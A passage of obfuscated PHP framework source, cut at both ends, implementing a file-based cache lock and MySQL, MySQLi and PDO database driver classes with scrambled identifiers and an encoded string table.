flock($‚º…Ğı³, LOCK_UN); fclose($‚º…Ğı³); } public static function fileUnlockAll() { $ğÇåø¬ =& $_SERVER[É¨™èà]; if (!isset($GLOBALS[$ğÇåø¬[957]]) || !$GLOBALS[$ğÇåø¬[957]]) { return; } foreach ($GLOBALS[$ğÇåø¬[957]] as $ÂˆÅÖ²Æ => $öÑ¬‚§) { if (!$öÑ¬‚§) { continue; } $GLOBALS[$ğÇåø¬[957]][$ÂˆÅÖ²Æ] = !1; flock($öÑ¬‚§, LOCK_UN); fclose($öÑ¬‚§); } $GLOBALS[$ğÇåø¬[957]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ı°øö÷³ =& $_SERVER[É¨™èà]; $ÂüØ¿² = $GLOBALS[$ı°øö÷³[6]][$ı°øö÷³[435]]; self::$cachePath = $ÂüØ¿²[$ı°øö÷³[233]][$ı°øö÷³[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ú é¡„, $÷ÇÛ´¹û = 0) { $ã‘ï‡¸‹ =& $_SERVER[É¨™èà]; $ÂˆÛáÂÌ = microtime(!0); $æÈÖ¤—ö = $ÂˆÛáÂÌ + $÷ÇÛ´¹û + 0.0001; $®Ÿµ£ƒü = rtrim(self::$cachePath, $ã‘ï‡¸‹[8]) . $ã‘ï‡¸‹[961] . md5($Ú é¡„) . $ã‘ï‡¸‹[958]; if (file_exists($®Ÿµ£ƒü) && filemtime($®Ÿµ£ƒü) && filemtime($®Ÿµ£ƒü) < time() - 10) { @unlink($®Ÿµ£ƒü); } do { if (file_exists($®Ÿµ£ƒü)) { cacheLockWait(); continue; } $¬Ùî÷ùû = fopen($®Ÿµ£ƒü, $ã‘ï‡¸‹[962]); if (!$¬Ùî÷ùû) { return !1; } $´üÉî” = flock($¬Ùî÷ùû, LOCK_EX | LOCK_NB); self::$caches[$Ú é¡„] = array($ã‘ï‡¸‹[963] => $¬Ùî÷ùû, $ã‘ï‡¸‹[233] => $®Ÿµ£ƒü); fwrite($¬Ùî÷ùû, $æÈÖ¤—ö); clearstatcache(); if ($¬Ùî÷ùû && $´üÉî”) { return !0; } cacheLockWait(); } while (microtime(!0) < $æÈÖ¤—ö); $this->unlock($Ú é¡„); return !1; } public function lockGet($¢˜êÄÕß) { $¤¼Ä—ø =& $_SERVER[É¨™èà]; $­ş‰å²ˆ = rtrim(self::$cachePath, $¤¼Ä—ø[8]) . $¤¼Ä—ø[961] . md5($¢˜êÄÕß) . $¤¼Ä—ø[958]; return file_exists($­ş‰å²ˆ); } public function unlock($ìİõ’ğ) { $¥õáã’è =& $_SERVER[É¨™èà]; $Öß¨±¥² = self::$caches[$ìİõ’ğ]; if (!$Öß¨±¥²) { return; } @flock($Öß¨±¥²[$¥õáã’è[963]], LOCK_UN); @fclose($Öß¨±¥²[$¥õáã’è[963]]); @unlink($Öß¨±¥²[$¥õáã’è[233]]); unset(self::$caches[$ìİõ’ğ]); } } goto B÷óîîÉ›ğ; E¿ëÌÃÁøÁ: class DbMysql extends Db { public function __construct($§Õ®ò™î = '') { $Üü §ïï =& $_SERVER[É¨™èà]; if (!extension_loaded($Üü §ïï[899])) { think_exception(think_lang($Üü §ïï[14]) . $Üü §ïï[979]); } if (!empty($§Õ®ò™î)) { $this->config = $§Õ®ò™î; if (empty($this->config[$Üü §ïï[17]])) { $this->config[$Üü §ïï[17]] = $Üü §ïï[12]; } } } public function connect($´º§Öş = '', $ ‹¨Ë = 0, $¼€üõé¿ = false) { $…óšÚš· =& $_SERVER[É¨™èà]; if (!isset($this->linkID[$ ‹¨Ë])) { if (empty($´º§Öş)) { $´º§Öş = $this->config; } $êÜç¶‰· = $´º§Öş[$…óšÚš·[980]] . ($´º§Öş[$…óšÚš·[981]] ? "\x3a{$´º§Öş[$…óšÚš·[981]]}" : $…óšÚš·[12]); $Ê“½Æªİ = !empty($´º§Öş[$…óšÚš·[17]][$…óšÚš·[18]]) ? $´º§Öş[$…óšÚš·[17]][$…óšÚš·[18]] : $this->pconnect; if ($Ê“½Æªİ) { $this->linkID[$ ‹¨Ë] = mysql_pconnect($êÜç¶‰·, $´º§Öş[$…óšÚš·[982]], $´º§Öş[$…óšÚš·[983]], 131072); } else { $this->linkID[$ ‹¨Ë] = mysql_connect($êÜç¶‰·, $´º§Öş[$…óšÚš·[982]], $´º§Öş[$…óšÚš·[983]], !0, 131072); } if (!$this->linkID[$ ‹¨Ë] || !empty($´º§Öş[$…óšÚš·[21]]) && !mysql_select_db($´º§Öş[$…óšÚš·[21]], $this->linkID[$ ‹¨Ë])) { think_exception(mysql_error()); } $„¾½µğ = mysql_get_server_info($this->linkID[$ ‹¨Ë]); mysql_query($…óšÚš·[984] . think_config($…óšÚš·[985]) . $…óšÚš·[58], $this->linkID[$ ‹¨Ë]); if ($„¾½µğ > $…óšÚš·[986]) { mysql_query($…óšÚš·[987], $this->linkID[$ ‹¨Ë]); } $this->connected = !0; if (1 != think_config($…óšÚš·[22])) { unset($this->config); } } return $this->linkID[$ ‹¨Ë]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($´ë—ı—) { $ñç‹Ãôº =& $_SERVER[É¨™èà]; if (0 === stripos($´ë—ı—, $ñç‹Ãôº[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $´ë—ı—; if ($this->queryID) { $this->free(); } think_action_status($ñç‹Ãôº[23], 1); think_status($ñç‹Ãôº[24]); $this->queryID = mysql_query($´ë—ı—, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Èµ‰×á³) { $Äß›É° =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Èµ‰×á³; if ($this->queryID) { $this->free(); } think_action_status($Äß›É°[25], 1); think_status($Äß›É°[24]); $¿…Úéş = mysql_query($Èµ‰×á³, $this->_linkID); $this->debug(); if (!1 === $¿…Úéş) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[É¨™èà][988], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $”€æùˆ = mysql_query($_SERVER[É¨™èà][989], $this->_linkID); $this->transTimes = 0; if (!$”€æùˆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÏĞ¢Ñ¿Õ = mysql_query($_SERVER[É¨™èà][990], $this->_linkID); $this->transTimes = 0; if (!$ÏĞ¢Ñ¿Õ) { $this->error(); return !1; } } return !0; } private function getAll() { $ü—¦©úÈ = array(); if ($this->numRows > 0) { while ($’Ë¾ùü¡ = mysql_fetch_assoc($this->queryID)) { $ü—¦©úÈ[] = $’Ë¾ùü¡; } mysql_data_seek($this->queryID, 0); } return $ü—¦©úÈ; } public function getFields($—úˆÑã) { $ôæ¼²‡ =& $_SERVER[É¨™èà]; $“Ú‰¯Ú± = $this->query($ôæ¼²‡[991] . $this->parseKey($—úˆÑã)); $—ÇÍ™âà = array(); if ($“Ú‰¯Ú±) { foreach ($“Ú‰¯Ú± as $ Ó÷Óìç => $­ÛáŸÖõ) { $—ÇÍ™âà[$­ÛáŸÖõ[$ôæ¼²‡[31]]] = array($ôæ¼²‡[32] => $­ÛáŸÖõ[$ôæ¼²‡[31]], $ôæ¼²‡[33] => $­ÛáŸÖõ[$ôæ¼²‡[34]], $ôæ¼²‡[35] => (bool) (strtoupper($­ÛáŸÖõ[$ôæ¼²‡[36]]) === $ôæ¼²‡[992]), $ôæ¼²‡[37] => $­ÛáŸÖõ[$ôæ¼²‡[38]], $ôæ¼²‡[39] => strtolower($­ÛáŸÖõ[$ôæ¼²‡[40]]) == $ôæ¼²‡[41], $ôæ¼²‡[42] => strtolower($­ÛáŸÖõ[$ôæ¼²‡[43]]) == $ôæ¼²‡[44]); } } return $—ÇÍ™âà; } public function getTables($ÂŸ§Æ±¥ = '') { $ëÚ¯¤İ· =& $_SERVER[É¨™èà]; if (!empty($ÂŸ§Æ±¥)) { $ëÂ–‹ƒ° = $ëÚ¯¤İ·[993] . $ÂŸ§Æ±¥ . $ëÚ¯¤İ·[994]; } else { $ëÂ–‹ƒ° = $ëÚ¯¤İ·[995]; } $îâç—Ò = $this->query($ëÂ–‹ƒ°); $òİ¢Ö¹ı = array(); foreach ($îâç—Ò as $×şÀì•Î => $¿²Ä‚ïª) { $òİ¢Ö¹ı[$×şÀì•Î] = current($¿²Ä‚ïª); } return $òİ¢Ö¹ı; } public function replace($Éš‰öü, $—©ëß = array()) { $è«ùÁ¬Ã =& $_SERVER[É¨™èà]; foreach ($Éš‰öü as $ˆƒè¥ => $äîñµİ×) { $Û¹›ññø = $this->parseValue($äîñµİ×); if (is_scalar($Û¹›ññø)) { $·Ê¹ËŒø[] = $Û¹›ññø; $±¹²Õ¶ó[] = $this->parseKey($ˆƒè¥); } } $„¯’ö›ş = $è«ùÁ¬Ã[996] . $this->parseTable($—©ëß[$è«ùÁ¬Ã[368]]) . $è«ùÁ¬Ã[997] . implode($è«ùÁ¬Ã[50], $±¹²Õ¶ó) . $è«ùÁ¬Ã[998] . implode($è«ùÁ¬Ã[50], $·Ê¹ËŒø) . $è«ùÁ¬Ã[999]; return $this->execute($„¯’ö›ş); } public function insertAll($×ÕŒÆ®ƒ, $¾ñ»­Ê¾ = array(), $Ÿ¦°Â‘¸ = false) { $ˆóˆ¿Ö =& $_SERVER[É¨™èà]; if (!is_array($×ÕŒÆ®ƒ[0])) { return !1; } $ŸÒ£É = array_keys($×ÕŒÆ®ƒ[0]); $ÍùØöÀÕ = array(); foreach ($×ÕŒÆ®ƒ as $‰¨§¶Ş²) { $Şìµƒ = array(); foreach ($‰¨§¶Ş² as $¬éò„¡î => $‚ç©¡£İ) { $‚ç©¡£İ = $this->parseValue($‚ç©¡£İ); if (is_scalar($‚ç©¡£İ)) { $Şìµƒ[] = $‚ç©¡£İ; } } $ÍùØöÀÕ[] = $ˆóˆ¿Ö[349] . implode($ˆóˆ¿Ö[50], $Şìµƒ) . $ˆóˆ¿Ö[999]; } array_walk($ŸÒ£É, array($this, $ˆóˆ¿Ö[1000])); $Èš…Ÿ†À = ($Ÿ¦°Â‘¸ ? $ˆóˆ¿Ö[1001] : $ˆóˆ¿Ö[1002]) . $ˆóˆ¿Ö[1003] . $this->parseTable($¾ñ»­Ê¾[$ˆóˆ¿Ö[368]]) . $ˆóˆ¿Ö[997] . implode($ˆóˆ¿Ö[50], $ŸÒ£É) . $ˆóˆ¿Ö[1004] . implode($ˆóˆ¿Ö[50], $ÍùØöÀÕ); return $this->execute($Èš…Ÿ†À); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $œ¡˜ôš =& $_SERVER[É¨™èà]; $this->error = mysql_errno() . $œ¡˜ôš[4] . mysql_error($this->_linkID); if ($œ¡˜ôš[12] != $this->queryStr) { $this->error .= LNG($œ¡˜ôš[48]) . $this->queryStr; } think_trace($this->error, $œ¡˜ôš[12], $œ¡˜ôš[49]); return $this->error; } public function escapeString($ŒßÒÁğÒ) { if ($this->_linkID) { return mysql_real_escape_string($ŒßÒÁğÒ, $this->_linkID); } else { return mysql_escape_string($ŒßÒÁğÒ); } } public function parseKey(&$™Š‡•äª, $““‰šÀŞ = true) { $’š‡Îš› =& $_SERVER[É¨™èà]; if ($““‰šÀŞ) { $™Š‡•äª = $this->parseKeyCheck($™Š‡•äª); } if ($™Š‡•äª != $’š‡Îš›[223] && !preg_match($’š‡Îš›[1005], $™Š‡•äª)) { $™Š‡•äª = $’š‡Îš›[471] . trim($™Š‡•äª, $’š‡Îš›[471]) . $’š‡Îš›[471]; } return $™Š‡•äª; } } class DbMysqli extends Db { public function __construct($³ˆƒ°Ì = '') { $Õ‡¨Ûá =& $_SERVER[É¨™èà]; if (!extension_loaded($Õ‡¨Ûá[1006])) { think_exception(think_lang($Õ‡¨Ûá[14]) . $Õ‡¨Ûá[1007]); } if (!empty($³ˆƒ°Ì)) { $this->config = $³ˆƒ°Ì; if (empty($this->config[$Õ‡¨Ûá[17]])) { $this->config[$Õ‡¨Ûá[17]] = $Õ‡¨Ûá[12]; } } } public function connect($„Ç«•‡Å = '', $ı§ô«¢À = 0) { $×ÉÂö¾Ÿ =& $_SERVER[É¨™èà]; if (!isset($this->linkID[$ı§ô«¢À])) { if (empty($„Ç«•‡Å)) { $„Ç«•‡Å = $this->config; } $this->linkID[$ı§ô«¢À] = new mysqli($„Ç«•‡Å[$×ÉÂö¾Ÿ[980]], $„Ç«•‡Å[$×ÉÂö¾Ÿ[982]], $„Ç«•‡Å[$×ÉÂö¾Ÿ[983]], $„Ç«•‡Å[$×ÉÂö¾Ÿ[21]], $„Ç«•‡Å[$×ÉÂö¾Ÿ[981]] ? intval($„Ç«•‡Å[$×ÉÂö¾Ÿ[981]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¢…ñ„ïÓ = $this->linkID[$ı§ô«¢À]->server_version; $this->linkID[$ı§ô«¢À]->query($×ÉÂö¾Ÿ[984] . think_config($×ÉÂö¾Ÿ[985]) . $×ÉÂö¾Ÿ[58]); if ($¢…ñ„ïÓ > $×ÉÂö¾Ÿ[986]) { $this->linkID[$ı§ô«¢À]->query($×ÉÂö¾Ÿ[987]); } $this->connected = !0; if (1 != think_config($×ÉÂö¾Ÿ[22])) { unset($this->config); } } return $this->linkID[$ı§ô«¢À]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¢¬Ä¿Ù) { $š¬ ñ€ =& $_SERVER[É¨™èà]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¢¬Ä¿Ù; if ($this->queryID) { $this->free(); } think_action_status($š¬ ñ€[23], 1); think_status($š¬ ñ€[24]); $this->queryID = $this->_linkID->query($¢¬Ä¿Ù); if ($this->_linkID->more_results()) { while (($“ùß£çú = $this->_linkID->next_result()) != NULL) { $“ùß£çú->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ü…‘ÓŒÎ) { $à·£Ü¦‚ =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ü…‘ÓŒÎ; if ($this->queryID) { $this->free(); } think_action_status($à·£Ü¦‚[25], 1); think_status($à·£Ü¦‚[24]); $½±ìâº = $this->_linkID->query($ü…‘ÓŒÎ); $this->debug(); if (!1 === $½±ìâº) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğ£İ­§İ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ğ£İ­§İ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $„ßÓŸ°— = $this->_linkID->rollback(); $this->transTimes = 0; if (!$„ßÓŸ°—) { $this->error(); return !1; } } return !0; } private function getAll() { $€Şáíç½ = array(); if ($this->numRows > 0) { for ($äšŸŞÉ = 0; $äšŸŞÉ < $this->numRows; $äšŸŞÉ++) { $€Şáíç½[$äšŸŞÉ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $€Şáíç½; } public function getFields($ÉˆÙ¯ê÷) { $”óÅÜñ =& $_SERVER[É¨™èà]; $ÀÙÃÎ¦Ã = $this->query($”óÅÜñ[991] . $this->parseKey($ÉˆÙ¯ê÷)); $Ôô£ğõ = array(); if ($ÀÙÃÎ¦Ã) { foreach ($ÀÙÃÎ¦Ã as $ãªÓ¼Õ => $¸Ğ«Æ”Ğ) { $Ôô£ğõ[$¸Ğ«Æ”Ğ[$”óÅÜñ[31]]] = array($”óÅÜñ[32] => $¸Ğ«Æ”Ğ[$”óÅÜñ[31]], $”óÅÜñ[33] => $¸Ğ«Æ”Ğ[$”óÅÜñ[34]], $”óÅÜñ[35] => (bool) ($¸Ğ«Æ”Ğ[$”óÅÜñ[36]] === $”óÅÜñ[12]), $”óÅÜñ[37] => $¸Ğ«Æ”Ğ[$”óÅÜñ[38]], $”óÅÜñ[39] => strtolower($¸Ğ«Æ”Ğ[$”óÅÜñ[40]]) == $”óÅÜñ[41], $”óÅÜñ[42] => strtolower($¸Ğ«Æ”Ğ[$”óÅÜñ[43]]) == $”óÅÜñ[44]); } } return $Ôô£ğõ; } public function getTables($Æ×Éíõ± = '') { $ÔÑõ—–“ =& $_SERVER[É¨™èà]; $ğÀ¢½‚Â = !empty($Æ×Éíõ±) ? $ÔÑõ—–“[993] . $Æ×Éíõ± . $ÔÑõ—–“[994] : $ÔÑõ—–“[995]; $ØŸìÓû = $this->query($ğÀ¢½‚Â); $Ù´¢×î­ = array(); if ($ØŸìÓû) { foreach ($ØŸìÓû as $üŸ‚õ¨¢ => $Àôˆí†é) { $Ù´¢×î­[$üŸ‚õ¨¢] = current($Àôˆí†é); } } return $Ù´¢×î­; } public function replace($‡ÅçİõÚ, $©”Õî®´ = array()) { $¸¯À—‚› =& $_SERVER[É¨™èà]; foreach ($‡ÅçİõÚ as $Å¿äàé¡ => $­İ¬—ƒ) { $ŸîŸ‡ÜĞ = $this->parseValue($­İ¬—ƒ); if (is_scalar($ŸîŸ‡ÜĞ)) { $Ç»Êœ§°[] = $ŸîŸ‡ÜĞ; $‚ïÎá°è[] = $this->parseKey($Å¿äàé¡); } } $ÍÌæë¬ = $¸¯À—‚›[996] . $this->parseTable($©”Õî®´[$¸¯À—‚›[368]]) . $¸¯À—‚›[997] . implode($¸¯À—‚›[50], $‚ïÎá°è) . $¸¯À—‚›[998] . implode($¸¯À—‚›[50], $Ç»Êœ§°) . $¸¯À—‚›[999]; return $this->execute($ÍÌæë¬); } public function insertAll($çô¦Á¼×, $øì–Šö = array(), $Ñ„¡ À‡ = false) { $ËÒ¥ƒÓ£ =& $_SERVER[É¨™èà]; if (!is_array($çô¦Á¼×[0])) { return !1; } $µòÕ¥ÎÕ = array_keys($çô¦Á¼×[0]); $ Ÿ€Ú˜à = array(); foreach ($çô¦Á¼× as $äš¸‘É€) { $¯„ÍÒÎ = array(); foreach ($äš¸‘É€ as $ñ­Û¥£ => $ºÓƒ¿Õû) { $ºÓƒ¿Õû = $this->parseValue($ºÓƒ¿Õû); if (is_scalar($ºÓƒ¿Õû)) { $¯„ÍÒÎ[] = $ºÓƒ¿Õû; } } $ Ÿ€Ú˜à[] = $ËÒ¥ƒÓ£[349] . implode($ËÒ¥ƒÓ£[50], $¯„ÍÒÎ) . $ËÒ¥ƒÓ£[999]; } array_walk($µòÕ¥ÎÕ, array($this, $ËÒ¥ƒÓ£[1000])); $İÎŒĞˆ¯ = $Ñ„¡ À‡ ? $ËÒ¥ƒÓ£[1001] : $ËÒ¥ƒÓ£[1002]; $Ç—‘‡€± = $İÎŒĞˆ¯ . $ËÒ¥ƒÓ£[1003] . $this->parseTable($øì–Šö[$ËÒ¥ƒÓ£[368]]) . $ËÒ¥ƒÓ£[997] . implode($ËÒ¥ƒÓ£[50], $µòÕ¥ÎÕ) . $ËÒ¥ƒÓ£[1004] . implode($ËÒ¥ƒÓ£[50], $ Ÿ€Ú˜à); return $this->execute($Ç—‘‡€±); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $öÈÍ«€á =& $_SERVER[É¨™èà]; $this->error = $this->_linkID->errno . $öÈÍ«€á[4] . $this->_linkID->error; if ($öÈÍ«€á[12] != $this->queryStr) { $this->error .= LNG($öÈÍ«€á[48]) . $this->queryStr; } think_trace($this->error, $öÈÍ«€á[12], $öÈÍ«€á[49]); return $this->error; } public function escapeString($šÍà£üÁ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($šÍà£üÁ); } else { return addslashes($šÍà£üÁ); } } public function parseKey(&$˜…¾±¿›, $²ÖéÊÜ” = true) { $ì›Åù¨› =& $_SERVER[É¨™èà]; if ($²ÖéÊÜ”) { $˜…¾±¿› = $this->parseKeyCheck($˜…¾±¿›); } if ($˜…¾±¿› != $ì›Åù¨›[223] && !preg_match($ì›Åù¨›[1005], $˜…¾±¿›)) { $˜…¾±¿› = $ì›Åù¨›[471] . trim($˜…¾±¿›, $ì›Åù¨›[471]) . $ì›Åù¨›[471]; } return $˜…¾±¿›; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($•©®–Ôø = '') { $­Š™ì =& $_SERVER[É¨™èà]; if (!class_exists($­Š™ì[1008])) { think_exception(think_lang($­Š™ì[14]) . $­Š™ì[1009]); } if (!empty($•©®–Ôø)) { $this->config = $•©®–Ôø; if (empty($this->config[$­Š™ì[17]])) { $this->config[$­Š™ì[17]] = array(); } } } public function connect($Ú™ƒë¹ƒ = '', $¡Åì©ÃÙ = 0) { $µíøÒŸÜ =& $_SERVER[É¨™èà]; if (!isset($this->linkID[$¡Åì©ÃÙ])) { if (empty($Ú™ƒë¹ƒ)) { $Ú™ƒë¹ƒ = $this->config; } $§©ÆÎØš = !empty($Ú™ƒë¹ƒ[$µíøÒŸÜ[17]][$µíøÒŸÜ[18]]) ? $Ú™ƒë¹ƒ[$µíøÒŸÜ[17]][$µíøÒŸÜ[18]] : $this->pconnect; if ($§©ÆÎØš) { $Ú™ƒë¹ƒ[$µíøÒŸÜ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¡Åì©ÃÙ] = new PDO($Ú™ƒë¹ƒ[$µíøÒŸÜ[1010]], $Ú™ƒë¹ƒ[$µíøÒŸÜ[982]], $Ú™ƒë¹ƒ[$µíøÒŸÜ[983]], $Ú™ƒë¹ƒ[$µíøÒŸÜ[17]]); } catch (PDOException $‚¦Ëßœ‡) { think_exception($‚¦Ëßœ‡->getMessage()); } $this->dbType = $this->_getDsnType($Ú™ƒë¹ƒ[$µíøÒŸÜ[1010]]); if (in_array($this->dbType, array($µíøÒŸÜ[1011], $µíøÒŸÜ[1012], $µíøÒŸÜ[1013], $µíøÒŸÜ[1014]))) { think_exception($µíøÒŸÜ[1015] . $this->dbType . $µíøÒŸÜ[1016] . $this->dbType . $µíøÒŸÜ[1017]); } if (!$this->linkID[$¡Åì©ÃÙ]) { think_exception($µíøÒŸÜ[1018]); } try { $this->linkID[$¡Åì©ÃÙ]->exec($µíøÒŸÜ[1019] . think_config($µíøÒŸÜ[985])); } catch (Exception $‚¦Ëßœ‡) { } $this->connected = !0; if (1 != think_config($µíøÒŸÜ[22])) { unset($this->config); } } return $this->linkID[$¡Åì©ÃÙ]; } public function free() { $this->PDOStatement = null; } public function query($ğøÊ‹‡„, $°ŒìŠ×¾ = array()) { $†ŞªÎŒ‰ =& $_SERVER[É¨™èà]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğøÊ‹‡„; if (!empty($°ŒìŠ×¾)) { $this->queryStr .= $†ŞªÎŒ‰[1020] . print_r($°ŒìŠ×¾, !0) . $†ŞªÎŒ‰[1021]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($†ŞªÎŒ‰[23], 1); think_status($†ŞªÎŒ‰[24]); $this->PDOStatement = $this->_linkID->prepare($ğøÊ‹‡„); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $©Å¾Şöò = $this->PDOStatement->execute($°ŒìŠ×¾); $this->debug(); if (!1 === $©Å¾Şöò) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($˜®ş‰Ğ‹, $ğªÆ‹Ö… = array()) { $¬ñ‰Õ¡» =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜®ş‰Ğ‹; if (!empty($ğªÆ‹Ö…)) { $this->queryStr .= $¬ñ‰Õ¡»[1020] . print_r($ğªÆ‹Ö…, !0) . $¬ñ‰Õ¡»[1021]; } $¢°ÆÇ = !1; if ($this->dbType == $¬ñ‰Õ¡»[1014]) { if (preg_match($¬ñ‰Õ¡»[1022], $this->queryStr, $ñıãƒ¼‹)) { $this->table = think_config($¬ñ‰Õ¡»[1023]) . str_ireplace(think_config($¬ñ‰Õ¡»[1024]), $¬ñ‰Õ¡»[316], $ñıãƒ¼‹[2]); $¢°ÆÇ = (bool) $this->query($¬ñ‰Õ¡»[1025] . strtoupper($this->table) . $¬ñ‰Õ¡»[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¬ñ‰Õ¡»[25], 1); think_status($¬ñ‰Õ¡»[24]); $this->PDOStatement = $this->_linkID->prepare($˜®ş‰Ğ‹); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $š¯„ÈÊ = $this->PDOStatement->execute($ğªÆ‹Ö…); $this->debug(); if (!1 === $š¯„ÈÊ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¢°ÆÇ || preg_match($¬ñ‰Õ¡»[1026], $˜®ş‰Ğ‹)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ãŒ°øÇ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ãŒ°øÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $®çÏìÌ‚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$®çÏìÌ‚) { $this->error(); return !1; } } return !0; } private function getAll() { $Äéë¾•ª = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Äéë¾•ª); return $Äéë¾•ª; } public function getFields($›ê·ºÎ) { $¸À²º‰ =& $_SERVER[É¨™èà]; $this->initConnect(!0); if (think_config($¸À²º‰[1027])) { $æîÏÍ‡ê = str_replace($¸À²º‰[1028], $›ê·ºÎ, think_config($¸À²º‰[1027])); } else { switch ($this->dbType) { case $¸À²º‰[1011]: case $¸À²º‰[1029]: $æîÏÍ‡ê = "\123\105\114\x45\103\124\x20\40\40\143\x6f\x6c\x75\155\x6e\x5f\156\x61\x6d\x65\x20\141\x73\40\47\x4e\141\155\145\47\54\40\40\x20\x64\141\164\x61\x5f\164\x79\x70\145\x20\x61\163\x20\47\124\171\160\x65\47\x2c\x20\x20\40\x63\x6f\x6c\x75\155\x6e\x5f\x64\x65\146\141\165\x6c\x74\40\x61\163\x20\47\x44\x65\146\x61\x75\154\x74\47\54\40\40\40\x69\163\x5f\x6e\x75\x6c\x6c\141\x62\x6c\145\x20\141\x73\x20\x27\116\x75\x6c\x6c\x27\xa\11\11\106\x52\117\115\11\151\156\146\x6f\x72\x6d\141\164\x69\x6f\x6e\137\163\x63\150\145\x6d\141\x2e\x74\x61\142\x6c\x65\163\x20\x41\x53\x20\164\xa\x9\x9\112\117\111\116\x9\151\156\x66\x6f\x72\x6d\x61\164\x69\157\x6e\x5f\163\143\x68\145\155\x61\x2e\x63\157\154\x75\x6d\156\x73\40\x41\x53\40\x63\xa\x9\11\x4f\116\40\40\164\56\164\x61\142\x6c\x65\x5f\143\141\x74\x61\x6c\x6f\x67\x20\75\x20\x63\x2e\164\141\x62\x6c\145\x5f\x63\x61\x74\x61\154\157\147\xa\x9\x9\x41\x4e\x44\x20\164\x2e\164\141\x62\154\x65\137\x73\143\150\145\x6d\141\40\75\40\143\56\164\141\x62\154\145\137\x73\143\150\x65\x6d\x61\12\x9\11\101\x4e\104\x20\x74\56\x74\141\142\x6c\145\x5f\156\x61\x6d\145\x20\x3d\x20\x63\56\x74\141\x62\x6c\145\x5f\156\x61\155\145\12\x9\11\127\110\105\122\105\40\40\40\x74\x2e\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x20\x3d\40\47{$›ê·ºÎ}\47"; break; case $¸À²º‰[1030]: $æîÏÍ‡ê = $¸À²º‰[1031] . $›ê·ºÎ . $¸À²º‰[1032]; break; case $¸À²º‰[1012]: case $¸À²º‰[1014]: $æîÏÍ‡ê = $¸À²º‰[1033] . $¸À²º‰[1034] . $¸À²º‰[1035] . strtoupper($›ê·ºÎ) . $¸À²º‰[1036] . strtoupper($›ê·ºÎ) . $¸À²º‰[1037]; break; case $¸À²º‰[1038]: $æîÏÍ‡ê = $¸À²º‰[1039] . $›ê·ºÎ . $¸À²º‰[1040]; break; case $¸À²º‰[1013]: break; case $¸À²º‰[1041]: default: $æîÏÍ‡ê = $¸À²º‰[1042] . ($this->dbType == $¸À²º‰[1041] ? "\x60{$›ê·ºÎ}\140" : $›ê·ºÎ); } } $­Å¸éî = $this->query($æîÏÍ‡ê); $¼š¹š = array(); if ($­Å¸éî) { foreach ($­Å¸éî as $´ù…û¾¶ => $˜Ğú¦“) { $˜Ğú¦“ = array_change_key_case($˜Ğú¦“); $˜Ğú¦“[$¸À²º‰[32]] = isset($˜Ğú¦“[$¸À²º‰[32]]) ? $˜Ğú¦“[$¸À²º‰[32]] : $¸À²º‰[316]; $˜Ğú¦“[$¸À²º‰[33]] = isset($˜Ğú¦“[$¸À²º‰[33]]) ? $˜Ğú¦“[$¸À²º‰[33]] : $¸À²º‰[316]; $ÉåÜÖ¬Ü = isset($˜Ğú¦“[$¸À²º‰[362]]) ? 